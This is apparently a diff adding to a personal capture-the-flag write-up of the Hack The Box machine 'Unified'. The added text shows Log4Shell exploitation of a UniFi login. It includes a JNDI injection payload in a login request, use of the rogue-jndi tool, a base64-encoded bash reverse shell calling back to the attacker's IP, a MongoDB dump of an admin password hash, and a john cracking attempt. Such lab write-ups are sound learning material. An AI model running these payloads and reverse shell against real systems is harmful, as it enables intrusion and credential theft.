@@ -13,6 +13,102 @@ All open ports in the 8000s range seem to return some kind of HTTP response. Let
 
 Port 8443 returns a UniFi login page. The name of the machine makes me suspect this is where the vulnerability will be.
 
-I tested the target for the vulnerability in {https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi#mitigation}[this article] but the machine doesn't seem to be vulnerable to it [EDIT: My testing methods were wrong] 
+I'll be mostly following {https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi}[this article] since it seems to show exactly what we need.
 
+To test whether the machine is vulnerable or not, we'll try get the server to ping our 389 port. As explained in the article, we can do this by modifying the POST request to login and adding a payload to the "remember" field.
+
+To check for successful pings we can use `tcpdump` to listen on port 389 using the following command:
+
+@code shell
+sudo tcpdump -i any port 389 -n
+@end
+
+We can use BurpSuite as a proxy to intercept the POST request and do the necessary modifications. This is what should be added to the request:
+
+@code txt
+{
+	"username":"a",
+	"password":"a",
+	"remember":"${jndi:ldap://[IP]/whatever}",
+	"strict":true}
+@end
+
+If everything went right we should see the following in our tcpdump:
+
+@code txt
+13:12:25.597353 tun0  In  IP 10.129.135.164.47594 > 10.10.16.78.389: Flags [S], seq 369100801, win 64240, options [mss 1338,sackOK,TS val 1022639672 ecr 0,nop,wscale 7], length 0                                                                            
+13:12:25.597363 tun0  Out IP 10.10.16.78.389 > 10.129.135.164.47594: Flags [R.], seq 0, ack 369100802, win 0, length 0
+@end
+
+(Note the IPs here are just the IPs that were being used for the tun0 interface at the time of writing).
+
+If that's the case, then it means our test was successful and the machine is indeed vulnerable to the exploit provided in the article.
+Now to set it up.
+
+We first need to install Maven because we don't have any Oracle software installed in our pure and innocent system (suspect of anyone who does).
+@code shell
+sudo apt update && sudo apt install openjdk-11-jre maven
+@end
+
+Then we run the following one-liner to download and compile the exploit:
+@code shell
+git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package
+@end
+
+After that we craft our reverse shell command and encode it in base64 to embed in the payload:
+
+@code shell
+echo 'bash -c bash -i >&/dev/tcp/[IP]/[PORT] 0>&1' | base64
+echo 'bash -c bash -i >&/dev/tcp/10.10.16.78/8001 0>&1' | base64
+@end
+
+Then we run the new tool with the following command:
+@code shell
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuNzgvODAwMCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname 10.10.16.78
+@end
+
+Where the long string is the base64 output from the previous command, and the hostname is the machine we're running the command in.
+
+To have the server get the payload from rogue-jndi we need to modify our previous BurpSuite POST request:
+@code txt
+{
+	"username":"a",
+	"password":"a",
+	"remember":"${jndi:ldap://[IP]/o=tomcat}",
+	"strict":true}
+@end
+
+To set up a listener we go with the usual `nc -lnvp 8001`.
+And if everything went according to plan, we got a reverse shell!
+
+Now some shell upgrading is in order:
+I tried my trusty
+@code shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+@end
+however the target machine does not seem to have python installed (the savages). We'll leave upgrading for now, because I see a clear path to advance right now:
+
+@code shell
+mongo --port 27177 ace --eval "db.admin.find().forEach(printjson);"
+@end
+
+Gives us the following:
+@code txt
+<SNIP>
+        "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
+        "name" : "administrator",
+        "email" : "administrator@unified.htb",
+        "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
+<SNIP>
+@end
+
+which means we have an admin password hash. Now to learn how to use hashcat to crack it.
+After a while I decided to give up,  wait until I can do HTB Academy's Intro to Hashcat course, and just try to use `john` instead.
+Here's the command I tried:
+@code shell
+john --wordlist=/usr/share/wordlists/rockyou.txt pwd.hash
+@end
+I didn't specify the format because I wasn't sure which of the thousand john SHA512 formats was the correct one and I haven't been able to reach a conclusion after an hour of research into both hashcat and john. That probably means that the John cracking is unfeasible (it shows some hours until completion which is probably outside the scope of this challenge.
+
+Let's take a break and then try the second possible method instead: Shadow Admin.
 
